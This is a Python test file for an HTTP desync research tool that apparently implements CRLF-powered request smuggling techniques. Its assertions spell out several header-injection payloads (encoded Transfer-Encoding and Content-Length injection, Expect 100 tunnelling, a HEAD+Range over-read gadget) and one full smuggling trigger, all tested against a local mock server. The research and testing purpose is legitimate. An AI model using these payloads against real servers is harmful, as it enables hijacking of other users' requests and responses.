"""
Unit and integration tests for CRLF-Powered Desync research techniques
(Tom Stacey & Tobia Righi: 'CRLF-Powered Desync Attacks: Beheading HTTP Streams').
"""

import socket
import threading
import time
from typing import Tuple

from anomaly_detector import AnomalyDetector
from deterministic_harness import DeterministicHarness
from engine.terminator_rfc_selector import TerminatorRFCSelector
from permutator import VectorPermutator
from weaponizer import RQPWeaponizer


def test_crlf_permutator_mutators():
    """Verifies that all 7 CRLF Request Header Injection mutators transform requests accurately."""
    permutator = VectorPermutator()
    assert len(permutator.get_crlf_desync_mutators()) == 7
    assert len(permutator.get_terminator_mutators()) == 32

    base_req = "GET / HTTP/1.1\r\nHost: target.local\r\nUser-Agent: test\r\n\r\n"

    # 1. Path RHI
    path_rhi, name1 = permutator._mutate_crlf_path_rhi(base_req)
    assert name1 == "crlf_path_request_header_injection"
    assert "/%20HTTP/1.1%0d%0a" in path_rhi
    assert "Transfer-Encoding:%20chunked" in path_rhi

    # 2. Cookie RHI
    cookie_rhi, name2 = permutator._mutate_crlf_cookie_rhi(base_req)
    assert name2 == "crlf_cookie_request_header_injection"
    assert "Cookie:" in cookie_rhi and "%0d%0aTransfer-Encoding:" in cookie_rhi

    # 3. Routing headers
    routing_rhi, name3 = permutator._mutate_crlf_routing_headers(base_req)
    assert name3 == "crlf_routing_header_injection"
    assert "X-Original-Url:" in routing_rhi and "X-Rewrite-URL:" in routing_rhi

    # 4. Double URL encoding
    double_rhi, name4 = permutator._mutate_crlf_double_url_encoding(base_req)
    assert name4 == "crlf_double_url_encoded_rhi"
    assert "%2520HTTP/1.1%250d%250a" in double_rhi

    # 5. 0.CL Connection Lock
    zero_cl, name5 = permutator._mutate_crlf_0_cl_connection_lock(base_req)
    assert name5 == "crlf_0_cl_connection_locked_desync"
    assert "Content-Length:%2045" in zero_cl

    # 6. Expect 100 Tunneling
    expect_tunnel, name6 = permutator._mutate_crlf_expect_100_tunnel(base_req)
    assert name6 == "crlf_expect_100_tunneling_bypass"
    assert "Expect:%20100-continue" in expect_tunnel

    # 7. HEAD Range Gadget
    head_range, name7 = permutator._mutate_head_range_gadget(base_req)
    assert name7 == "head_range_arbitrary_overread_gadget"
    assert head_range.startswith("HEAD / HTTP/1.1")
    assert "Range: bytes=1-650" in head_range


def test_crlf_anomaly_detection():
    """Verifies that safe discovery responses (417, 501, 505) and over-read anomalies are detected."""
    # 417 Expectation Failed
    resp_417 = b"HTTP/1.1 417 Expectation Failed\r\nServer: origin-backend\r\nContent-Length: 0\r\n\r\n"
    anoms_417 = AnomalyDetector.analyze_response(resp_417)
    assert any(a["type"] == "crlf_rhi_discovery" and "417" in a["description"] for a in anoms_417)

    # 501 Not Implemented
    resp_501 = b"HTTP/1.1 501 Not Implemented\r\nServer: backend\r\nContent-Length: 0\r\n\r\n"
    anoms_501 = AnomalyDetector.analyze_response(resp_501)
    assert any(a["type"] == "crlf_rhi_discovery" and "501" in a["description"] for a in anoms_501)

    # 505 Version Not Supported
    resp_505 = b"HTTP/1.1 505 HTTP Version Not Supported\r\nServer: backend\r\nContent-Length: 0\r\n\r\n"
    anoms_505 = AnomalyDetector.analyze_response(resp_505)
    assert any(a["type"] == "crlf_rhi_discovery" and "505" in a["description"] for a in anoms_505)

    # Expect 100 Tunneling leak (multi-status with 100 Continue)
    resp_tunnel = (
        b"HTTP/1.1 100 Continue\r\n\r\n"
        b"HTTP/1.1 200 OK\r\nServer: internal-proxy\r\nContent-Length: 4\r\n\r\nDATA"
    )
    anoms_tunnel = AnomalyDetector.analyze_response(resp_tunnel)
    assert any(a["type"] == "expect_100_tunnel_leak" for a in anoms_tunnel)

    # HEAD Range over-read anomaly
    resp_head_overread = (
        b"HTTP/1.1 206 Partial Content\r\nContent-Range: bytes 1-650/5000\r\nContent-Length: 650\r\n\r\n"
        + b"A" * 650
    )
    anoms_overread = AnomalyDetector.analyze_response(resp_head_overread)
    assert any(a["type"] == "head_range_overread" for a in anoms_overread)


def test_rfc_selector_crlf_keywords():
    """Verifies that RFC selector scores and identifies CRLF Request Header Injection operative text."""
    rhi_text = (
        "When an intermediary forward-proxies requests using request header injection or request splitting, "
        "improper decoding of %0d%0a or unencoded $uri causes 417 expectation failed or expect: 100-continue "
        "tunnel leaks across connection-locked backends."
    )
    score, matched = TerminatorRFCSelector.score_text_for_terminator(rhi_text)
    assert score > 10.0
    assert "request header injection" in matched
    assert "request splitting" in matched
    assert "expect: 100-continue" in matched
    assert "connection-locked" in matched


def _run_test_server(handler_fn, port_holder: list, ready_event: threading.Event, stop_event: threading.Event):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", 0))
    port = server.getsockname()[1]
    port_holder.append(port)
    server.listen(5)
    server.settimeout(0.5)
    ready_event.set()

    while not stop_event.is_set():
        try:
            client, _ = server.accept()
            client.settimeout(1.0)
            handler_fn(client)
            client.close()
        except socket.timeout:
            continue
        except Exception:
            break
    server.close()


def test_weaponizer_connection_locked_desync():
    """
    Tests RQPWeaponizer.test_connection_locked_desync against a local server
    simulating a connection-locked desynchronization (browser-powered exploit).
    """
    ready_event = threading.Event()
    stop_event = threading.Event()
    port_holder = []

    def handler(client: socket.socket):
        data = client.recv(4096)
        if not data:
            return
        # Server simulates front-end passing injected 0.CL to backend
        # 1st request emits an empty response, then victim request receives smuggled 404
        client.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n")
        data2 = client.recv(4096)
        if data2:
            # Emits response intended for smuggled request
            client.sendall(
                b"HTTP/1.1 404 Not Found\r\nContent-Length: 15\r\nConnection: close\r\n\r\n/victim_capture"
            )

    t = threading.Thread(target=_run_test_server, args=(handler, port_holder, ready_event, stop_event))
    t.daemon = True
    t.start()
    ready_event.wait(2.0)
    port = port_holder[0]

    try:
        weaponizer = RQPWeaponizer(host="127.0.0.1", port=port, timeout=1.5)
        crlf_trigger = "GET /images/%20HTTP/1.1%0d%0aContent-Length:%2045%0d%0aX:%20x HTTP/1.1\r\nHost: target.local\r\n\r\n$PAYLOAD"
        success, reason, meta = weaponizer.test_connection_locked_desync(
            crlf_trigger, smuggled_endpoint="/victim_capture"
        )
        assert success is True
        assert "Connection-Locked Desynchronization Confirmed" in reason
        assert "/victim_capture" in meta["victim_resp"]
    finally:
        stop_event.set()
        t.join(timeout=1.0)


def test_weaponizer_head_range_gadget():
    """
    Tests RQPWeaponizer.test_head_range_gadget against a local server returning Content-Range with body.
    """
    ready_event = threading.Event()
    stop_event = threading.Event()
    port_holder = []

    def handler(client: socket.socket):
        data = client.recv(4096)
        if not data:
            return
        if b"HEAD " in data and b"Range:" in data:
            client.sendall(
                b"HTTP/1.1 206 Partial Content\r\nContent-Range: bytes 1-650/5000\r\nContent-Length: 650\r\nConnection: keep-alive\r\n\r\n"
                + b"X" * 650
            )
            # Read follow-up
            data2 = client.recv(4096)
            if data2:
                client.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nOK")

    t = threading.Thread(target=_run_test_server, args=(handler, port_holder, ready_event, stop_event))
    t.daemon = True
    t.start()
    ready_event.wait(2.0)
    port = port_holder[0]

    try:
        weaponizer = RQPWeaponizer(host="127.0.0.1", port=port, timeout=1.5)
        success, reason, meta = weaponizer.test_head_range_gadget(path="/test", overread_bytes=650)
        assert success is True
        assert "HEAD + Range Gadget confirmed" in reason
        assert "206 Partial Content" in meta["head_resp"]
    finally:
        stop_event.set()
        t.join(timeout=1.0)
